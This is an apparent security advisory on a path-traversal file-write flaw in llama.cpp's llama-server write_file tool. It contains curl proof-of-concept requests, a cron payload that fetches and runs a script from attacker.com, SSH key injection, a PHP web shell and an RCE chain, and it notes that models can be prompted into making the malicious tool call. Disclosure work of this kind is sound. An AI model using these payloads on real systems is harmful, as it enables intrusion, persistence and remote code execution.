# Vulnerability Report: Arbitrary File Write via Path Traversal

## 1. Executive Summary

llama.cpp 内置 HTTP 服务器（`llama-server`）在启用 `--tools write_file` 参数时，`server_tool_write_file::invoke()` 函数接收用户提供的 `path` 参数后，未执行任何路径规范化、白名单校验或目录边界检查，即直接调用 `fs::create_directories()` 创建中间目录并通过 `std::ofstream` 写入文件内容。攻击者可通过绝对路径（如 `/etc/cron.d/backdoor`）或相对路径穿越序列（如 `../../etc/passwd`）向主机文件系统任意位置写入任意内容，进而实现系统配置篡改、持久化后门植入或服务拒绝。

该漏洞可通过两条攻击路径触发：
1. **直接调用** — 向 `POST /tools` 端点发送 JSON 请求，绕过 LLM 推理直接执行工具；
2. **间接调用** — 通过 `/v1/chat/completions` API 构造提示词，诱导模型生成 `write_file` 工具调用。

---

## 2. Affected Component

### 2.1 Vulnerable Function

**File**: `tools/server/server-tools.cpp`  
**Class**: `server_tool_write_file`  
**Method**: `invoke(json params)`  
**Lines**: 448–471

```cpp
json invoke(json params) override {
    std::string path    = params.at("path").get<std::string>();   // [1] 用户输入直接提取，无校验
    std::string content = params.at("content").get<std::string>();

    std::error_code ec;
    fs::path fpath(path);
    if (fpath.has_parent_path()) {
        fs::create_directories(fpath.parent_path(), ec);          // [2] 递归创建任意目录
        if (ec) {
            return {{"error", "failed to create directories: " + ec.message()}};
        }
    }

    std::ofstream f(path, std::ios::binary);                      // [3] 向任意路径写入
    if (!f) {
        return {{"error", "failed to open file for writing: " + path}};
    }
    f << content;
    if (!f) {
        return {{"error", "failed to write file: " + path}};
    }

    return {{"result", "file written successfully"}, {"path", path}, {"bytes", content.size()}};
}
```

### 2.2 Attack Entry Points

| Entry Point | Route | File | Line |
|-------------|-------|------|------|
| Direct tool invocation | `POST /tools` | `tools/server/server.cpp` | 224 |
| LLM-mediated invocation | `POST /v1/chat/completions` | `tools/server/server.cpp` | — |

**Direct invocation handler** (`tools/server/server-tools.cpp:741–748`):

```cpp
handle_post = [this](const server_http_req & req) -> server_http_res_ptr {
    auto res = std::make_unique<server_http_res>();
    try {
        json body = json::parse(req.body);
        std::string tool_name = body.at("tool").get<std::string>();
        json params = body.value("params", json::object());
        json result = invoke(tool_name, params);    // 直接执行，无鉴权
        res->data   = safe_json_to_str(result);
    } catch (...) { /* error handling */ }
    return res;
};
```

---

## 3. Root Cause Analysis

该漏洞存在三个层面的安全缺陷：

| # | 缺陷 | 代码位置 | 说明 |
|---|------|----------|------|
| 1 | **缺乏输入校验** | Line 449 | `path` 参数直接从 JSON 提取，未执行路径规范化（`fs::canonical`）、黑名单过滤（`../`）或白名单校验 |
| 2 | **无限制目录创建** | Line 454–458 | `fs::create_directories()` 递归创建父目录，攻击者可借此创建 `/etc/cron.d/`、`/root/.ssh/` 等敏感目录结构 |
| 3 | **无限制文件写入** | Line 461 | `std::ofstream` 以 binary 模式打开攻击者控制的路径，无 `O_NOFOLLOW` 保护，可覆盖已有文件或创建新文件 |

**补充说明**: `POST /tools` 端点未实施任何认证或授权机制，任何可达该端口的网络请求均可直接调用已启用的工具。

---

## 4. Reproduction

### 4.1 Environment

| Item | Value |
|------|-------|
| GCC | 10.2.1 |
| CMake | 3.31.2 |
| llama.cpp | b8953-434b2a1ff (compiled from source) |
| Model | Qwen2.5-0.5B-Instruct (Q4_K_M GGUF) |

### 4.2 Steps to Reproduce

**Step 1 — Build llama-server from source**

```bash
cd /ossfs/workspace/llama.cpp
cmake -B build -DLLAMA_BUILD_SERVER=ON -DLLAMA_BUILD_EXAMPLES=OFF \
      -DLLAMA_BUILD_TESTS=OFF -DGGML_CUDA=OFF -DLLAMA_CURL=OFF
cmake --build build --target llama-server -j$(nproc)
```

**Step 2 — Start server with write_file tool enabled**

```bash
export LD_LIBRARY_PATH=./build/bin:./build/ggml/src:$LD_LIBRARY_PATH
./build/bin/llama-server \
    -m /path/to/model.gguf \
    --tools write_file \
    --host 127.0.0.1 --port 18080
```

Server output confirms tool activation:

```
srv  main: -----------------
srv  main: Built-in tools are enabled, do not expose server to untrusted environments
srv  main: This feature is EXPERIMENTAL and may be changed in the future
srv  main: -----------------
```

**Step 3 — Exploit: Absolute path write**

```bash
curl -s http://127.0.0.1:18080/tools \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "write_file",
    "params": {
      "path": "/tmp/pwned_c02.txt",
      "content": "PWNED_BY_C02_POC - Path Traversal via write_file\n"
    }
  }'
```

**Server response**:

```json
{"result":"file written successfully","path":"/tmp/pwned_c02.txt","bytes":49}
```

**Verification**:

```bash
$ cat /tmp/pwned_c02.txt
PWNED_BY_C02_POC - Path Traversal via write_file
```

**Step 4 — Exploit: Relative path traversal**

```bash
curl -s http://127.0.0.1:18080/tools \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "write_file",
    "params": {
      "path": "../../tmp/traversal_c02.txt",
      "content": "PWNED - Relative Path Traversal ../../tmp/traversal_c02.txt\n"
    }
  }'
```

**Server response**:

```json
{"result":"file written successfully","path":"../../tmp/traversal_c02.txt","bytes":60}
```

**Verification** (server CWD 为 `/ossfs/workspace/llama`，穿越两级到 `/ossfs/tmp/`):

```bash
$ cat /ossfs/tmp/traversal_c02.txt
PWNED - Relative Path Traversal ../../tmp/traversal_c02.txt
```

### 4.3 Reproduction Evidence

| Test Case | Payload Path | Actual Write Location | Result |
|-----------|-------------|----------------------|--------|
| Absolute path | `/tmp/pwned_c02.txt` | `/tmp/pwned_c02.txt` | **SUCCESS** — file written, content verified |
| Relative traversal | `../../tmp/traversal_c02.txt` | `/ossfs/tmp/traversal_c02.txt` | **SUCCESS** — escaped server CWD |

---

## 5. Impact Assessment

### 5.1 Direct Impact

| Impact Dimension | Level | Description |
|-----------------|-------|-------------|
| Confidentiality | None | 该漏洞为写入型，不直接泄露数据 |
| Integrity | **High** | 可覆盖或创建文件系统任意位置的文件 |
| Availability | **High** | 可覆盖关键系统文件（如 `/etc/hosts`、`/lib/`）导致服务不可用 |

### 5.2 Attack Scenarios

**Scenario A — Persistent Backdoor via Cron Job**

```json
{
  "tool": "write_file",
  "params": {
    "path": "/etc/cron.d/backdoor",
    "content": "* * * * * root curl http://attacker.com/shell.sh | bash\n"
  }
}
```

若服务进程以 root 身份运行，攻击者可植入定时任务实现持久化远程代码执行。

**Scenario B — SSH 密钥注入**

```json
{
  "tool": "write_file",
  "params": {
    "path": "/root/.ssh/authorized_keys",
    "content": "ssh-rsa AAAA...attacker_public_key... attacker@evil.com\n"
  }
}
```

写入攻击者公钥后可直接 SSH 登录目标主机。

**Scenario C — Web Shell 植入**

```json
{
  "tool": "write_file",
  "params": {
    "path": "/var/www/html/shell.php",
    "content": "<?php system($_GET['cmd']); ?>"
  }
}
```

若主机同时运行 Web 服务器，可写入 Web Shell。

**Scenario D — 与 C-01 (RCE) 组合攻击链** [H-04]

```
Step 1: POST /tools → exec_shell_command → "echo 'payload' > /tmp/pwn.sh && chmod +x /tmp/pwn.sh"
Step 2: POST /tools → write_file → path: "/etc/cron.d/backdoor", content: "* * * * * root /tmp/pwn.sh\n"
```

C-01 + C-02 串联可将单次文件写入升级为持久化 RCE。
